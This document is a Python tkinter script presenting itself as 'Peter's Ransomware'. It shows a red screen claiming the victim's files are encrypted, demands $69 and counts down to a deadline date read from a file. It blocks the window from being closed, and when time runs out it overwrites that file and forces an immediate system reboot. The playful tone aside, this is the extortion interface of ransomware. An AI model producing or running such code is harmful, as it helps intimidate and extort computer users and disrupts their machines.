import tkinter as tk
import datetime
import sys
import os

file = open(sys.argv[1], 'rb')
month = int.from_bytes(file.read(1), 'big')
day = int.from_bytes(file.read(1), 'big')

current_date = datetime.datetime.now()
delete_date = datetime.datetime(2020, month, day)
seconds_left = (delete_date - current_date).total_seconds()

file.close()

class ExampleApp(tk.Tk):
    def __init__(self):
        tk.Tk.__init__(self)
        self.title("Peter's Ransomware")
        self.configure(bg='red')

        self.frame_upper = tk.Frame(master=self, height=50, bg="red")
        self.frame_upper.pack(side=tk.TOP, fill=tk.X)

        self.oops_label = tk.Label(master=self.frame_upper, text='Oops, your files have unfortunately been encrypted', bg='red', fg="white")
        self.oops_label.config(font=("Comic Sans MS", 14))
        self.oops_label.pack(side=tk.TOP)


        self.frame1 = tk.Frame(master=self, height=200, width = 100, bg="white", highlightbackground="black", highlightthickness=1)
        self.frame1.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        self.note_label = tk.Label(master=self.frame1, bg='white', fg="black", justify=tk.LEFT, anchor=tk.NW)
        self.note = 'What happened to my computer?\nAll your important personal files have been encrypted,\nand all of these documents are no longer accessible.\n\n Please pay $69 for us to decrypt your files :P'
        self.note_label.config(text=self.note, font=("Comic Sans MS", 11))
        self.note_label.pack(side=tk.TOP)

        self.frame2 = tk.Frame(master=self, height=200, width = 100, bg="red", highlightbackground="black", highlightthickness=1)
        self.frame2.pack(side=tk.LEFT, fill=tk.BOTH,expand=True)

        self.note_label = tk.Label(master=self.frame2, bg='red', fg="black", justify=tk.LEFT, anchor=tk.NW)
        self.note = 'Your files will be lost on\n' + str(delete_date)
        self.note_label.config(text=self.note, font=("Comic Sans MS", 18, "bold"))
        self.note_label.pack(side=tk.TOP)

        self.note_label2 = tk.Label(master=self.frame2, bg='red', fg="black", justify=tk.LEFT, anchor=tk.NW)
        self.note2 = 'Time Left'
        self.note_label2.config(text=self.note2, font=("Comic Sans MS", 18, "bold"))
        self.note_label2.pack(side=tk.TOP)

        self.time_label = tk.Label(master=self.frame2, bg='red', fg='black', justify=tk.LEFT, anchor=tk.NW, font=("Comic Sans MS", 18, "bold"))
        self.time_label.pack(side=tk.TOP)

        self.protocol("WM_DELETE_WINDOW", self.anti_closing)
        self.remaining = 0
        self.countdown(seconds_left)

    def countdown(self, remaining = None):
        if remaining is not None:
            self.remaining = remaining

        if self.remaining <= 0:
            self.time_label.configure(text="Game's Over!")
            file = open(sys.argv[1], 'wb')
            file.write(b'\x99\x99')
            file.close()
            os.system("shutdown /r /t 1")
        else:
            self.time_label.configure(text="%s" % str(datetime.timedelta(seconds = self.remaining)))
            self.after(1000, self.countdown, remaining - 1)

    def anti_closing(self):
        pass
if __name__ == "__main__":
    app = ExampleApp()
    app.mainloop()
